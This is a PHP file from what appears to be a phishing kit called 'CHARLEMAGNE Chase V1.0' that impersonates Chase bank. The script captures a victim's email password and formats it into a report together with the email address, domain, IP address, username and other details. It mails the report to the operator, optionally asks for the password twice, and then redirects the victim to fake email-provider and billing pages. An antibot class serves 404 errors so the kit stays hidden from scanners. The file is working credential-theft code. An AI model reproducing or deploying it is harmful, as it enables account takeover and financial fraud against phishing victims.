<?php

    session_start();

    require_once '../Comp.php';
    require_once '../Antibot.php';
    require_once '../demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }

    if (isset(
        $_SESSION['email'],
        $_POST['emailPassword']
    )) {
        if (!$comps->checkEmpty(
            $_SESSION['email'],
            $_POST['emailPassword']
        )) {
            $_SESSION['emailPassword'] = $_POST['emailPassword'];

            $content = '
                <meta name="viewport" content="width=device-width, initial-scale=1.0">

                <style>
        
                    * {
                        font-family: Arial;
                        font-weight: normal;
                        color: #126BC5;
                        margin: 0;
                        padding: 0;
                    }

                    .text-center {
                        text-align: center;
                    }
        
                    .small {
                        font-size: .8rem;
                    }
        
                    .mt-05 {
                        margin-top: .5rem;
                    }
        
                    .mt-1 {
                        margin-top: 1rem;
                    }
        
                    .mt-2, .my-2 {
                        margin-top: 2rem;
                    }
        
                    .my-3 {
                        margin: 3rem 0;
                    }
        
                    .mb-2, .my-2 {
                        margin-bottom: 2rem;
                    }
        
                    .text-light {
                        color: #8c8c8c;
                    }

                    .text-chase {
                        color: #126BC5;
                    }
        
                    .container {
                        padding-left: 1.5rem;
                        padding-right: 1.5rem;
                    }
        
                    hr {
                        border: none;
                        margin-top: 1rem;
                        margin-bottom: 1rem;
                        height: 1px;
                        background-color: #8c8c8c;
                    }
        
                </style>

                <div class="text-center my-2">
                    <h4 class="text-light">CHARLEMAGNE <span class="text-chase">Chase</span> V1.0</h4>
                    <h2>(1) Email Access from ' . $_SESSION['username'] . '</h2>
                </div>
                
                <div class="container">
                    <div class="mt-2">
                        <div>
                            <h3 class="text-light">🐙 Email Access</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            <h3>Email: ' . $_SESSION['email'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Password: ' . $_SESSION['emailPassword'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Domain: ' . ucwords(substr($_SESSION['email'], strpos($_SESSION['email'], '@') + 1)) . '</h3>
                        </div>
                        ' . $comps->userDetails() . '
                    </div>
                    <div class="my-3 text-center">
                        <span class="small text-light">Private page made by <a href="CHARLEMAGN" target="_blank">CHARLEMAGNE</a>, not for redistribution.</span>
                    </div>
                </div>
            ';

            if (isset($settings['EmailTwice']) && $settings['EmailTwice'] == "on") {
                if (!isset($_SESSION['emailTwice']) || !$_SESSION['emailTwice']) {
                    $_SESSION['emailTwice'] = 1;
        
                    if ($comps->mailX("(1) Email Access | Chase | " . $_SESSION['ip'] . " | " . $_SESSION['username'], $content)) {
                        if (!$comps->userEmail($_SESSION['email'])) {
                            die($comps->headerX("../../Login/email/Microsoft.php"));
                        } else {
                            die($comps->headerX("../../Login/email/" . $comps->userEmail($_SESSION['email']) . ".php"));
                        }
                    } else {
                        die($antibot->throw404());
                    }
                }
            
                if (isset($_SESSION['emailTwice']) && $_SESSION['emailTwice']) {
                    unset($_SESSION['emailTwice']);
        
                    if ($comps->mailX("(2) Email Access | Chase | " . $_SESSION['ip'] . " | " . $_SESSION['username'], $content)) {
                        die($comps->headerX("../../Login/billing.php"));
                    } else {
                        die($antibot->throw404());
                    }
                }
            } else {
                if ($comps->mailX("(1) Email Access | Chase | " . $_SESSION['ip'] . " | " . $_SESSION['username'], $content)) {
                    die($comps->headerX("../../Login/billing.php"));
                } else {
                    die($antibot->throw404());
                }
            }
        } else {
            echo $antibot->throw404();
            die();
        }   
    } else {
        echo $antibot->throw404();
        die();
    }